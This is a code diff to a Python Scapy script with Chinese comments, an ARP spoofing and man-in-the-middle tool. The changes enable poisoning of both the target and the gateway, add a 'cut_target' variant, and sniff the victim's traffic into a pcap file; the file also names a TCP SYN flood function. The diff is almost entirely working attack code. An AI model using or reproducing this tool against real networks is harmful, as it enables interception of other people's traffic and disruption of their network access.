@@ -70,7 +70,6 @@ def tcp_syn_flood(ip,dPort):
 
 def packet(packet):
     print packet.show()
-    print packet[ARP].psrc + '  ' + packet[ARP].pdst
 
 def start_sniff_arp(packet_callback,IPSECTION):
 
@@ -90,7 +89,7 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
     # 发出退出信号到主线程
     #os.kill(os.getpid(), signal.SIGKILL)
-    #os.kill(os.getpid(), signal.SIGINT)
+    os.kill(os.getpid(), signal.SIGINT)
 
 def get_mac(ip_address):
 
@@ -134,8 +133,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     print "[*] ARP poison attack finished"
     return
 
-def poison_target2(gateway_ip, gateway_mac, target_ip, target_mac):
-
+def cut_target(gateway_ip, gateway_mac, target_ip, target_mac):
     # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
     # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
     poison_target = ARP()
@@ -151,13 +149,13 @@ def poison_target2(gateway_ip, gateway_mac, target_ip, target_mac):
     poison_gateway.pdst = gateway_ip    # 目的地是网关
     poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac
 
-    print "[*] Beginning the ARP poison. ［CTRL_C to stop］"
+    print "[*] Beginning the ARP attack. ［CTRL_C to stop］"
 
     while True:
         try:
             # 开始发送ARP欺骗包(投毒)
             send(poison_target)
-            #send(poison_gateway)
+            send(poison_gateway)
             # 停两秒
             time.sleep(2)
         except KeyboardInterrupt:
@@ -179,7 +177,7 @@ def start_sniff(packet_count,bdf_filter):
 
 if __name__ == "__main__":
     global mode
-    packet_count = 0
+    packet_count = 10
     '''
     gateway_ip = '10.2.10.254'
     target_ip = '10.2.10.251'
@@ -210,22 +208,24 @@ if __name__ == "__main__":
 
     # 启动ARP投毒（欺骗）线程
     poison_thread = Job(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+    poison_thread.setDaemon(True)
     poison_thread.start()
 
     try:
         print "[*] Starting sniffer for %d packets" % packet_count
 
         bpf_filter = "ip host %s " % target_ip  # 过滤器
-        sniff_thread = Job(target=start_sniff,args=(packet_count,bpf_filter))
-        sniff_thread.start()
-        #packets = sniff(count=packet_count, filter=bpf_filter,stopper = stop_sniff,stopper_timeout =1)
+        #sniff_thread = Job(target=start_sniff,args=(packet_count,bpf_filter))
+        #sniff_thread.setDaemon(True)
+        #sniff_thread.start()
+        packets = sniff(count=packet_count, filter=bpf_filter,prn=packet)#,stopper = stop_sniff,stopper_timeout =1)
 
         # 将捕获到的数据包输出到文件
 
-        time.sleep(5)
-
+        #time.sleep(5)
+        wrpcap('listen_data.pcap', packets)
         poison_thread.stop()
-        sniff_thread.stop()
+        #sniff_thread.stop()
         # 还原网络配置
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 
